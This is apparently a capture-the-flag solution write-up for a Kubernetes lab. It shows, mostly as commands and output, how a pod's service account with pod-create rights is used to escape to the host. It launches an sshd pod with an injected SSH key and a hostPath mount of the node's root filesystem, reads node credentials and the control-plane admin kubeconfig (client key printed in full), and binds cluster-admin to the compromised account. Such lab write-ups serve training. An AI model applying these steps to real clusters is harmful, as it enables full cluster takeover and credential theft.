# Solution

## Check that we have a service account rights

```bash
# get kubectl
apk update
apk add curl
curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl
chmod u+x kubectl
mv kubectl /usr/bin

# find my namespace
cat /run/secrets/kubernetes.io/serviceaccount/namespace

# check permissions
kubectl auth can-i --list --namespace=pwn-me
```

Sample output:

```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods                                            []                                    []               [create list get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

```bash
# install ssh client
apk add openssh
ssh-keygen -t rsa -b 4096
```

```
~ # cat /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDCrOtrfVoiRaIczi0SrC08YoDwgPXMCCOs2BrHNVFotnNCRsCoJOfrUZpQcXPn3H1LlhFJAgHYPKibAXzSiSHG/l7imL/tbf+lLZkLx/U96TyFpUAXyi9/yjif2nMM2LtwOAZDH7JzPVbCDAbQUhZwkWnkSQ95pLJtp3XTnbywRsjbI6q3ADurjQF9BjqAhnQfj/+rNaaCQwjaVX3BQboxmquK4Klk40sdMfRLMo69Xm51AqqxqmVD1L5ZWL8YsWxYzuLmJ/EmVA0NbX3GByTgz6zQxcRkdXC3xpdVPecfiqofMgDR+5mlqXLI+zBhWDP901MbaKjnYePKwGVTo4qOmfi4qB3g6Dkc2FpS/L8xNS8Zt2aM+o6vdVx98Hjmw8xVGwV8brhgWd8tGP9qNbSLT8riKJBABXh/5xDoGVtepqRwGu+gQf/uC8CBznDkoxxakzTpngiii4Wc4kbrsVCs7fq8MRt1nANqm089Ewo7k+9yqIWYFzGUUhVRLX/KxUMsf2kC/uz6KIUmzWrhcvxb3s9rg3qOvQnIxsxgiY+0jMXXVtcRHzmDStBE13AKRmKfEG7ec/mDAa/N/o79wph+SrQYJqxF87FawBI19fy3rAi0l8tnhcnal80G9XNkA6TzwooBNU85ZtOYsHCXP3PA8FQ2tDlYeE4PkB37N6ilkw== root@vulnerable-app
```

figure out how to mount the key

```bash
docker pull panubo/sshd:latest
docker inspect panubo/sshd:latest
```

Entrypoint: 


```
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"/usr/sbin/sshd\" \"-D\" \"-e\" \"-f\" \"/etc/ssh/sshd_config\"]"
            ],
            "Image": "sha256:4532b1f9f87c183e6ca9284db1e5006dbc8be65a6f197e10971cacbea81a429b",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/entry.sh"
            ],
```

Pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sshd
  namespace: pwn-me
spec:
  containers:
  - env:
    - name: SSH_ENABLE_ROOT
      value: "true"
    image: panubo/sshd:latest
    imagePullPolicy: IfNotPresent
    name: sshd
    command:
    - sh
    - -c
    - "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config"
    volumeMounts:
    - name: host-vol
      mountPath: /srv/host
  restartPolicy: Always
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

```bash
kubectl -n pwn-me get pods -o wide
```

```
/ # env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
HOSTNAME=vulnerable-app
SHLVL=2
HOME=/root
TERM=xterm
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_HOST=10.43.0.1
PWD=/

/ # cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE2MjkzMDU2NzkwHhcNMjEwODE4MTY1NDM5WhcNMzEwODE2MTY1NDM5
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE2MjkzMDU2NzkwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATMe84cAtbDyRVYvpFecgy7p9Xd3jzd/D3A60zncCVo
qSswpRvwHAHjQ/w1hA0tLOawNPjnb9M50jkyfZPPakoNo0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUd27CvvSGZwaOxvdY07hw
4Y/m2IIwCgYIKoZIzj0EAwIDSAAwRQIhAIdZaxyzVs0LPUUYlId7tgT+/PYTrqJi
Y2lOgA5i306WAiAssk+geIwESF5566ed+y1mHONPWZLs+AY2JhPoIg4cjg==
-----END CERTIFICATE-----
```

```
sshd:~# chroot /srv/host/
sshd:/# cat /etc/hostname
k3d-pipeline-cluster-agent-2
sshd:/# kubectl auth can-i --list -n pwn-me
The connection to the server localhost:8080 was refused - did you specify the right host or port?

sshd:/# ps auxwww
PID   USER     COMMAND
    1 0        /sbin/docker-init -- /bin/entrypoint.sh agent
    7 0        /bin/k3s agent
   29 0        containerd
  761 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 7a8aec9336ae3ebb2d8429073baf0a0ccee0a6bb5deedd6a7208
  777 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 6c013071d886130a0d1ac34fbdd6f7870d969326e19d2e902c4f
  825 0        /pause
  826 0        /pause
  944 0        {entry} /bin/sh /usr/bin/entry
  995 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 1a8d2850d6241bc405d8e769ae85f97931c4ee695fe81c02d525
 1023 0        /pause
 1038 0        {entry} /bin/sh /usr/bin/entry
 1122 1001     /metrics-sidecar
 1328 1001     /dashboard --insecure-bind-address=0.0.0.0 --bind-address=0.0.0.0 --auto-generate-certificates --namesp
 2601 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id b4efd15ba36dd219e46a8dc287c151f55aa50c522def002cd07f
 2621 0        /pause
 2652 0        bash ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
 2721 0        sshd: /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config [listener] 0 of 10-100 startups
 4277 0        sshd: root@pts/0
 4279 0        -ash
 4310 0        /bin/ash -i
 6624 0        ps auxwww


sshd:/# k3s -h
NAME:
   k3s - Kubernetes, but small and simple

USAGE:
   k3s [global options] command [command options] [arguments...]

VERSION:
   v1.21.2+k3s1 (5a67e8dc)

COMMANDS:
   server         Run management server
   agent          Run node agent
   kubectl        Run kubectl
   crictl         Run crictl
   ctr            Run ctr
   etcd-snapshot  Trigger an immediate etcd snapshot
   help, h        Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug                     (logging) Turn on debug logs [$K3S_DEBUG]
   --data-dir value, -d value  (data) Folder to hold state default /var/lib/rancher/k3s or ${HOME}/.rancher/k3s if not root
   --help, -h                  show help
   --version, -v               print the version


sshd:/# cat /etc/rancher/node/password
f9257fac6572145560669d61bce6e8fd

sshd:/# ls /var/log/pods/
kube-system_svclb-traefik-gnmrc_4e3c9f99-0102-4719-a357-19a32b72322f
kubernetes-dashboard_dashboard-metrics-scraper-5594697f48-zsxll_0b90a6fa-f7df-467c-8cc8-992bab5c4ddb
kubernetes-dashboard_kubernetes-dashboard-57c9bfc8c8-hvhm5_6d77f0fc-3d12-49ce-a80a-60cb7bd91f15
pwn-me_sshd_107d015a-e8b0-4820-a921-6ce0392669d8

sshd:/# find / -name *config* | grep kube
/var/lib/rancher/k3s/agent/kubeproxy.kubeconfig
/var/lib/rancher/k3s/agent/kubelet.kubeconfig
/var/lib/rancher/k3s/agent/k3scontroller.kubeconfig
find: ‘/proc/1/map_files’: Permission denied
find: ‘/proc/7/map_files’: Permission denied
find: ‘/proc/29/map_files’: Permission denied
find: ‘/proc/761/map_files’: Permission denied
find: ‘/proc/777/map_files’: Permission denied
find: ‘/proc/944/map_files’: Permission denied
find: ‘/proc/995/map_files’: Permission denied
find: ‘/proc/1038/map_files’: Permission denied
find: ‘/proc/1122/map_files’: Permission denied
find: ‘/proc/1328/map_files’: Permission denied
find: ‘/proc/2601/map_files’: Permission denied

sshd:/# ls /var/lib/rancher/k3s/agent/
client-ca.crt              client-kube-proxy.key  etc                       pod-manifests
client-k3s-controller.crt  client-kubelet.crt     k3scontroller.kubeconfig  server-ca.crt
client-k3s-controller.key  client-kubelet.key     kubelet.kubeconfig        serving-kubelet.crt
client-kube-proxy.crt      containerd             kubeproxy.kubeconfig      serving-kubelet.key

sshd:/# cat /var/lib/rancher/k3s/agent/kubelet.kubeconfig
apiVersion: v1
clusters:
- cluster:
    server: https://127.0.0.1:6444
    certificate-authority: /var/lib/rancher/k3s/agent/server-ca.crt
  name: local
contexts:
- context:
    cluster: local
    namespace: default
    user: user
  name: Default
current-context: Default
kind: Config
preferences: {}
users:
- name: user
  user:
    client-certificate: /var/lib/rancher/k3s/agent/client-kubelet.crt
    client-key: /var/lib/rancher/k3s/agent/client-kubelet.key

sshd:/# export KUBECONFIG=/var/lib/rancher/k3s/agent/kubelet.kubeconfig

sshd:/# kubectl cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
The connection to the server 127.0.0.1:6444 was refused - did you specify the right host or port?

sshd:/# ls /var/lib/rancher/k3s/agent/etc/
cni  containerd  crictl.yaml  flannel  k3s-agent-load-balancer.json
```


```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sshd
  namespace: pwn-me
spec:
  containers:
  - env:
    - name: SSH_ENABLE_ROOT
      value: "true"
    image: panubo/sshd:latest
    imagePullPolicy: IfNotPresent
    name: sshd
    command:
    - sh
    - -c
    - "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config"
    volumeMounts:
    - name: host-vol
      mountPath: /srv/host
  restartPolicy: Always
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - k3d-pipeline-cluster-server-0
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory

```

```
/ # kubectl apply -f /tmp/pod.yml
Error from server (Forbidden): error when applying patch:
{"metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"sshd\",\"namespace\":\"pwn-me\"},\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"kubernetes.io/hostname\",\"operator\":\"In\",\"values\":[\"k3d-pipeline-cluster-server-0\"]}]}]}}},\"containers\":[{\"command\":[\"sh\",\"-c\",\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDl6OFov1sHfa+UO4X+IKu9J0B0+fU9bALBbXgJ2wvv1qn9fs2KA9K7B1z052MtjMx+S9hko2K5WFV+4O9hg6/sNqs9VGyLey3CkctgFriceM69fWxDCwK0KPxWsZ0HOPo/qEGnTrE9Nmlo/MeZXgW3EVHvpiM/UgTahTFlMYu4sblEfBUA14gnJGaUr6HzQBVXZA4+nyDfVTVDBywzoIJVyZfm92OgQXQCUi9WsJIPr5OVd+WRvzBrAXJDTzx8LJJQUG7GB50Es9mCey9lIDBmmogu9HgUw8Y8tUatqNsgJQLhsOuTBcNOdj3UFpghByW8RVaWTMuLuAAb5Vz395lbPLLavVSUJx6mnMb3tKlv7cMbBe6b5wXeVdFLPFLCyk6fHj2P/bM2chqcmJN4GXkYV4tdZATZ8PxwZm9G2DDh7p0BBtZH7LS6n3UtMP/FSX7q4B/6ipkIqbZDIlLizBjys5w4FZEVtIgmqrSy16Klg4de/usZ7ho+LbEc3f+Yo4YvJBtejawsR7nQfM9fgkSrKG/PQyec+zeWJCe4OB9wirZxzz8WpncoTpecXZIblMPEyQ+PlggLxQUiF3Q2nY3Q+KSzLaJ7dCv98eu3blYORUG9WjsLWmyYLRfjjuMGCjTwN/uYMGBz+UyffWhOIiQhBBB9g9j6SCDOb7oEfwa7kw== root@vulnerable-app' \\u003e /root/.ssh/authorized_keys \\u0026\\u0026 ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config\"],\"env\":[{\"name\":\"SSH_ENABLE_ROOT\",\"value\":\"true\"}],\"image\":\"panubo/sshd:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"sshd\",\"volumeMounts\":[{\"mountPath\":\"/srv/host\",\"name\":\"host-vol\"}]}],\"restartPolicy\":\"Always\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-vol\"}]}}\n"}},"spec":{"$setElementOrder/containers":[{"name":"sshd"}],"$setElementOrder/volumes":[{"name":"host-vol"}],"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchExpressions":[{"key":"kubernetes.io/hostname","operator":"In","values":["k3d-pipeline-cluster-server-0"]}]}]}}},"containers":[{"$setElementOrder/volumeMounts":[{"mountPath":"/srv/host"}],"name":"sshd"}]}}
to:
Resource: "/v1, Resource=pods", GroupVersionKind: "/v1, Kind=Pod"
Name: "sshd", Namespace: "pwn-me"
for: "/tmp/pod.yml": pods "sshd" is forbidden: User "system:serviceaccount:pwn-me:vulnerable-app" cannot patch resource "pods" in API group "" in the namespace "pwn-me"


/ # kubectl delete pod sshd -n pwn-me
pod "sshd" deleted


/ # kubectl apply -f /tmp/pod.yml
pod/sshd created


/ # kubectl -n pwn-me get pods -o wide
NAME             READY   STATUS    RESTARTS   AGE     IP           NODE                            NOMINATED NODE   READINESS GATES
vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-pipeline-cluster-agent-1    <none>           <none>
sshd             1/1     Running   0          20s     10.42.0.53   k3d-pipeline-cluster-server-0   <none>           <none>

/ # ssh 10.42.0.53
The authenticity of host '10.42.0.53 (10.42.0.53)' can't be established.
ED25519 key fingerprint is SHA256:tHH8YEjpNALJ/g26uX5+Z1jZWjxdfiXgA5N+m+HQFao.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.42.0.53' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

sshd:~# chroot /srv/host
sshd:/# cat /etc/hostname
k3d-pipeline-cluster-server-0

sshd:/# kubectl cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
The connection to the server 127.0.0.1:6443 was refused - did you specify the right host or port?

sshd:/# cat /etc/rancher/k3s/k3s.yaml
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUyTWprek1EVTJOemt3SGhjTk1qRXdPREU0TVRZMU5ETTVXaGNOTXpFd09ERTJNVFkxTkRNNQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUyTWprek1EVTJOemt3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUTWU4NGNBdGJEeVJWWXZwRmVjZ3k3cDlYZDNqemQvRDNBNjB6bmNDVm8KcVNzd3BSdndIQUhqUS93MWhBMHRMT2F3TlBqbmI5TTUwamt5ZlpQUGFrb05vMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVWQyN0N2dlNHWndhT3h2ZFkwN2h3CjRZL20ySUl3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUloQUlkWmF4eXpWczBMUFVVWWxJZDd0Z1QrL1BZVHJxSmkKWTJsT2dBNWkzMDZXQWlBc3NrK2dlSXdFU0Y1NTY2ZWQreTFtSE9OUFdaTHMrQVkySmhQb0lnNGNqZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://127.0.0.1:6443
  name: default
contexts:
- context:
    cluster: default
    user: default
  name: default
current-context: default
kind: Config
preferences: {}
users:
- name: default
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJrakNDQVRlZ0F3SUJBZ0lJT2RiQW44dEM0QVF3Q2dZSUtvWkl6ajBFQXdJd0l6RWhNQjhHQTFVRUF3d1kKYXpOekxXTnNhV1Z1ZEMxallVQXhOakk1TXpBMU5qYzVNQjRYRFRJeE1EZ3hPREUyTlRRek9Wb1hEVEl5TURneApPREUyTlRRek9Wb3dNREVYTUJVR0ExVUVDaE1PYzNsemRHVnRPbTFoYzNSbGNuTXhGVEFUQmdOVkJBTVRESE41CmMzUmxiVHBoWkcxcGJqQlpNQk1HQnlxR1NNNDlBZ0VHQ0NxR1NNNDlBd0VIQTBJQUJIZW5qVkF4UWI1Q1pKdDQKY29VOGlWY3VoNjNaSHZScElrTCswcm9sVW1GVk1meFBlVGl5Mys3K1VpSUlZTlV3TXplekgvMGc0VUhoUUJOTgpIN2p5SjFXalNEQkdNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0RBakFmCkJnTlZIU01FR0RBV2dCU2c5OFJnWm1lZkF0M0ZIczhOT0JTNTJBdmxhekFLQmdncWhrak9QUVFEQWdOSkFEQkcKQWlFQTBJOC9wLzcrVWdzNmE3Z2hvb0J3T3JvSEZtZFBuR1FPWGFjVEZHd1ZjekVDSVFEOTU5a1hWU2xlV2wrcQpzbGt1V05lVHZEYXVkZzcvYzBabTJqcDZxaU9tU1E9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQpNSUlCZURDQ0FSMmdBd0lCQWdJQkFEQUtCZ2dxaGtqT1BRUURBakFqTVNFd0h3WURWUVFEREJock0zTXRZMnhwClpXNTBMV05oUURFMk1qa3pNRFUyTnprd0hoY05NakV3T0RFNE1UWTFORE01V2hjTk16RXdPREUyTVRZMU5ETTUKV2pBak1TRXdId1lEVlFRRERCaHJNM010WTJ4cFpXNTBMV05oUURFMk1qa3pNRFUyTnprd1dUQVRCZ2NxaGtqTwpQUUlCQmdncWhrak9QUU1CQndOQ0FBVE1RMytRRE10L3JJZkEwQyt1NE5kS2wvWE15cHVZbjNya0o3MkYyT3pIClZSZVpuN2ZBVDFldDMyZEFGdG11dEdDbVNGUU56czlXU3BnTnQ0dmlSMHE5bzBJd1FEQU9CZ05WSFE4QkFmOEUKQkFNQ0FxUXdEd1lEVlIwVEFRSC9CQVV3QXdFQi96QWRCZ05WSFE0RUZnUVVvUGZFWUdabm53TGR4UjdQRFRnVQp1ZGdMNVdzd0NnWUlLb1pJemowRUF3SURTUUF3UmdJaEFQTHFYYVFDRHRrSm9uZzBQWVVGMHRMZUVMQk1mbU93ClEweCt5RHVFY0JNYUFpRUFyVGsrYVhjWFU4YWQ5SFVySDNKN3dMTEVONGFLSmJMdVdzVUlERk9WNnZVPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    client-key-data: LS0tLS1CRUdJTiBFQyBQUklWQVRFIEtFWS0tLS0tCk1IY0NBUUVFSUxJQ1lpUDBOUzI2aWJlcG91LytDcWhRM05MaHA2NEtvb3dUVHNjWHBCempvQW9HQ0NxR1NNNDkKQXdFSG9VUURRZ0FFZDZlTlVERkJ2a0prbTNoeWhUeUpWeTZIcmRrZTlHa2lRdjdTdWlWU1lWVXgvRTk1T0xMZgo3djVTSWdoZzFUQXpON01mL1NEaFFlRkFFMDBmdVBJblZRPT0KLS0tLS1FTkQgRUMgUFJJVkFURSBLRVktLS0tLQo=


sshd:/# cp /etc/rancher/k3s/k3s.yaml /tmp/config
sshd:/# export KUBECONFIG=/tmp/config
sshd:/# vi /tmp/config
sshd:/# kubectl cluster-info
Kubernetes control plane is running at https://k3d-pipeline-cluster-server-0:6443
CoreDNS is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
Metrics-server is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.


sshd:/# kubectl auth can-i --list -n kube-system
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]


sshd:/# ls /var/lib/rancher/k3s/server/manifests/
ccm.yaml  coredns.yaml  local-storage.yaml  metrics-server  rolebindings.yaml  traefik.yaml

sshd:/# kubectl -n pwn-me get pod vulnerable-app -o yaml
...
  serviceAccount: vulnerable-app
  serviceAccountName: vulnerable-app
...


sshd:/# kubectl get clusterroles
NAME                                                                   CREATED AT
cluster-admin                                                          2021-08-18T16:54:43Z
...
```

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: give-my-full-access
  namespace: pwn-me
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: vulnerable-app
  namespace: pwn-me
```

```
kubectl apply -f /tmp/rb.yml
```


```
/ # kubectl auth can-i --list -n pwn-me
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
pods                                            []                                    []               [create list get delete]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```


## Create SSHD pod

## create volume to escape onto node

## use escape to create clusterrolebinding to get full access



